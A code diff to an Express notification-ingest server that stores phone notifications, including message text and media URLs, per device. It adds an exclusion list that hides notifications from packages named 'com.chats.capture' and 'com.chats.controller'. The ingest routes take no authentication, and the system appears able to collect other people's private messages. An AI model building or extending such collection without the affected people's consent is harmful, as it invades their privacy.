@@ -8,10 +8,23 @@ const { authenticate, optionalAuth } = require('../middleware/auth');
 // Optimized logging - only log full data in development
 const isDebug = process.env.NODE_ENV !== 'production';
 
+// Packages to exclude from notification storage
+const EXCLUDED_PACKAGES = ['com.chats.capture', 'com.chats.controller'];
+
 // POST /api/notifications - Single notification
 router.post('/', async (req, res) => {
     try {
         const notification = req.body;
+        
+        // Filter out notifications from excluded packages
+        if (notification.appPackage && EXCLUDED_PACKAGES.includes(notification.appPackage)) {
+            console.log(`🚫 FILTERED: Ignoring notification from excluded package: ${notification.appPackage}`);
+            return res.json({
+                success: true,
+                message: 'Notification filtered (excluded package)',
+                filtered: true
+            });
+        }
         
         // Optimized logging - only log summary unless DEBUG mode
         if (isDebug) {
@@ -43,6 +56,8 @@ router.post('/', async (req, res) => {
             appName: notification.appName,
             title: notification.title || null,
             text: notification.text || null,
+            messageLines: notification.messageLines || null,
+            isGroupSummary: notification.isGroupSummary || false,
             timestamp: notification.timestamp || Date.now(),
             mediaUrls: notification.mediaUrls || null,
             serverMediaUrls: notification.serverMediaUrls || null,
@@ -94,10 +109,18 @@ router.post('/', async (req, res) => {
 // POST /api/notifications/batch - Batch notifications
 router.post('/batch', async (req, res) => {
     try {
-        const notifications = req.body;
+        const { notifications } = req.body;
+        
+        if (!Array.isArray(notifications) || notifications.length === 0) {
+            return res.status(400).json({
+                success: false,
+                message: 'notifications array is required and must not be empty'
+            });
+        }
+        
         console.log('📥 /api/notifications/batch received', {
-            count: Array.isArray(notifications) ? notifications.length : null,
-            sample: Array.isArray(notifications) && notifications.length > 0 ? {
+            count: notifications.length,
+            sample: notifications.length > 0 ? {
                 id: notifications[0]?.id,
                 appPackage: notifications[0]?.appPackage,
                 appName: notifications[0]?.appName,
@@ -107,31 +130,44 @@ router.post('/batch', async (req, res) => {
             } : null
         });
         
-        // Optimized logging
-        console.log(`📥 API RECEIVED BATCH: ${notifications.length} notifications`);
-        if (isDebug) {
-            console.log('📥 BATCH DATA:', JSON.stringify(notifications, null, 2));
+        // Filter out notifications from excluded packages
+        const filteredNotifications = notifications.filter(notification => {
+            if (notification.appPackage && EXCLUDED_PACKAGES.includes(notification.appPackage)) {
+                console.log(`🚫 FILTERED: Ignoring notification from excluded package: ${notification.appPackage}`);
+                return false;
+            }
+            return true;
+        });
+        
+        const filteredCount = notifications.length - filteredNotifications.length;
+        if (filteredCount > 0) {
+            console.log(`🚫 FILTERED: ${filteredCount} notification(s) from excluded packages`);
         }
         
-        if (!Array.isArray(notifications) || notifications.length === 0) {
-            console.error('❌ API VALIDATION ERROR: Invalid batch data', {
-                isArray: Array.isArray(notifications),
-                length: notifications?.length
+        if (filteredNotifications.length === 0) {
+            console.log('🚫 FILTERED: All notifications were filtered out');
+            return res.json({
+                success: true,
+                message: 'All notifications filtered (excluded packages)',
+                filtered: true,
+                count: 0
             });
-            return res.status(400).json({
-                success: false,
-                message: 'Invalid batch data'
-            });
+        }
+        
+        // Optimized logging
+        console.log(`📥 API RECEIVED BATCH: ${notifications.length} notifications (${filteredNotifications.length} after filtering)`);
+        if (isDebug) {
+            console.log('📥 BATCH DATA:', JSON.stringify(filteredNotifications, null, 2));
         }
         
         const db = getDb();
-        const ids = notifications.map(notification => notification.id).filter(Boolean);
+        const ids = filteredNotifications.map(notification => notification.id).filter(Boolean);
         const existingNotifications = ids.length
             ? await db.collection('notifications').find({ id: { $in: ids } }).toArray()
             : [];
         const existingIconMap = new Map(existingNotifications.map(n => [n.id, n.iconUrl]));
 
-        const operations = notifications.map(notification => {
+        const operations = filteredNotifications.map(notification => {
             const iconUrl = notification.iconUrl || existingIconMap.get(notification.id) || null;
             return {
             replaceOne: {
@@ -143,6 +179,8 @@ router.post('/batch', async (req, res) => {
                     appName: notification.appName,
                     title: notification.title || null,
                     text: notification.text || null,
+                    messageLines: notification.messageLines || null,
+                    isGroupSummary: notification.isGroupSummary || false,
                     timestamp: notification.timestamp || Date.now(),
                     mediaUrls: notification.mediaUrls || null,
                     serverMediaUrls: notification.serverMediaUrls || null,
@@ -165,13 +203,13 @@ router.post('/batch', async (req, res) => {
         console.log('✅ /api/notifications/batch saved', { count: operations.length });
         
         // Optimized logging
-        console.log(`✅ API SAVED BATCH: ${notifications.length} notifications to database`);
+        console.log(`✅ API SAVED BATCH: ${filteredNotifications.length} notifications to database${filteredCount > 0 ? ` (${filteredCount} filtered)` : ''}`);
         if (isDebug) {
             console.log('✅ BATCH SAVED DATA:', JSON.stringify(operations.map(op => op.replaceOne.replacement), null, 2));
         }
         
         // Broadcast WebSocket updates for each notification
-        notifications.forEach(notification => {
+        filteredNotifications.forEach(notification => {
             if (notification.deviceId) {
                 websocketService.broadcastDataUpdate(notification.deviceId, 'notification', notification);
             }
@@ -179,7 +217,7 @@ router.post('/batch', async (req, res) => {
         
         const response = {
             success: true,
-            message: `Saved ${notifications.length} notifications`
+            message: `Saved ${filteredNotifications.length} notifications${filteredCount > 0 ? ` (${filteredCount} filtered)` : ''}`
         };
         if (isDebug) {
             console.log('📤 API BATCH RESPONSE:', JSON.stringify(response, null, 2));
@@ -213,6 +251,9 @@ router.get('/', authenticate, async (req, res) => {
         
         const db = getDb();
         const filter = {};
+        
+        // Always exclude notifications from excluded packages
+        filter.appPackage = { $nin: EXCLUDED_PACKAGES };
         
         // Device owners can only see notifications from their assigned device
         if (role === 'device_owner' && assignedDeviceId) {
